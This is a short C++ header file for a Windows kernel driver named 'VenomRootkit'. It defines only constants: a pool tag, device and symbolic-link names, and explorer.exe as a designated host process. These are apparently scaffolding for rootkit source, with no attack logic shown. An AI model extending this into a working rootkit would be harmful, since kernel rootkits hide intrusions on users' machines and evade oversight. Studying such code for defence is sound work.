#pragma once

#include <ntifs.h>

constexpr auto POOL_TAG = 'VMR';

constexpr UNICODE_STRING VENOM_HOST_PROCESS = RTL_CONSTANT_STRING(L"explorer.exe");
constexpr auto VENOM_SYMLINK = L"\\??\\VenomRootkit";
constexpr auto VENOM_DEVICE_NAME = L"\\Device\\VenomRootkit";
